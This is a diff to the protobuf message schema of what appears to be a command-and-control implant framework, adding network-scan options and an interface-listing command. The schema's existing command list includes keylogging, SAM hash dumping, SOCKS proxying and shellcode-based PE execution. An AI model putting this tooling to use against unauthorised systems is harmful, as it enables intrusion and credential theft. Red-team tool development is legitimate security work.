@@ -99,6 +99,8 @@ message CommandMessage {
   ExecutePEOptions execute_pe_options = 9;
   // Execute-BOF specific options
   BOFOptions bof_options = 10;
+  // Network Scan specific options
+  NetworkScanOptions network_scan_options = 11;
   
   enum CommandType {
     SHELL = 0;
@@ -110,7 +112,7 @@ message CommandMessage {
     SCREENSHOT = 6;
     KEYLOG = 7;
     PROCESS_LIST = 8;
-    NETWORK_SCAN = 9;
+    NETWORK_SCAN = 9; // args: none (uses options)
     PTY_START = 10; // command: shell path or empty; args: cols, rows
     PTY_STDIN = 11; // data: raw stdin bytes
     PTY_RESIZE = 12; // args: cols, rows
@@ -123,6 +125,7 @@ message CommandMessage {
     MODULE_CONFIG = 19; // configure a module: command=module_name, data=config_json
     MODULE_LIST = 20; // list all available/loaded modules
     HASHDUMP = 21; // dump SAM database hashes (Windows only)
+    IFCONFIG = 54; // show network interfaces (ipconfig/ifconfig/ip addr)
 
     // SOCKS Proxy & Port Forwarding
     SOCKS_START = 22; // args: [port] - start SOCKS5 proxy on specified port
@@ -169,6 +172,16 @@ message CommandMessage {
     EXECUTE_PE = 52; // data: loader shellcode, options: sacrificial process settings
     EXECUTE_BOF = 53; // data: BOF .o file bytes, options: BOF execution settings
   }
+}
+
+// Network Scan Options
+message NetworkScanOptions {
+  string target_range = 1; // CIDR or single IP
+  repeated int32 ports = 2; // List of ports to scan
+  bool scan_udp = 3; // Scan UDP instead of TCP
+  int32 threads = 4; // Number of concurrent threads (default 10)
+  int32 timeout_ms = 5; // Timeout per port in ms (default 1000)
+  bool banner_grab = 6; // Attempt to grab service banner
 }
 
 // PTY streaming API (console <-> server). Server forwards to implant via CommandMessage
